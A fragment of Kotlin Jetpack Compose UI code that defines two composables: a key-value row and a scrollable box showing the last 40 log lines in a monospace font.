private fun KeyValue(key: String, value: String) {
    Row(Modifier.fillMaxWidth()) {
        Text(key, style = MaterialTheme.typography.bodySmall, modifier = Modifier.weight(1f))
        Text(
            value,
            style = MaterialTheme.typography.bodySmall,
            fontFamily = FontFamily.Monospace,
            color = MaterialTheme.colorScheme.primary,
        )
    }
}

@Composable
private fun LogBlock(lines: List<String>) {
    if (lines.isEmpty()) return
    Box(
        modifier = Modifier
            .fillMaxWidth()
            .heightIn(max = 150.dp)
            .background(
                MaterialTheme.colorScheme.surfaceContainerLowest,
                RoundedCornerShape(10.dp),
            )
            .padding(10.dp),
    ) {
        Column(Modifier.verticalScroll(rememberScrollState())) {
            lines.takeLast(40).forEach {
                Text(
                    it,
                    style = MaterialTheme.typography.labelSmall,
                    fontFamily = FontFamily.Monospace,
                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                )
            }
        }
    }
}
